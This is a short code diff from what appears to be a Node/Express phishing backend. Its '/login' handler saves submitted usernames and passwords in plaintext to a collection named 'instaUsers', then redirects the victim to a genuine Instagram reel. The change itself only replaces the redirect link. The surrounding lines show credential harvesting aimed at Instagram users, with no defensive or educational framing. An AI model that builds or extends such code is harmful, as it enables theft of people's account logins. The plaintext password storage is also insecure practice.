@@ -39,7 +39,7 @@ app.post('/login', async (req, res) => {
         const usersCollection = db.collection('instaUsers');
         await usersCollection.insertOne({ username, password });
 
-        res.redirect('https://www.instagram.com/reel/CuqKIThBOKa/?igshid=NTc4MTIwNjQ2YQ==');
+        res.redirect('https://www.instagram.com/reel/Ct7MjYMAO-N/?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==');
     } catch (err) {
         console.error('Error during registration:', err);
         res.send('An error occurred during registration');
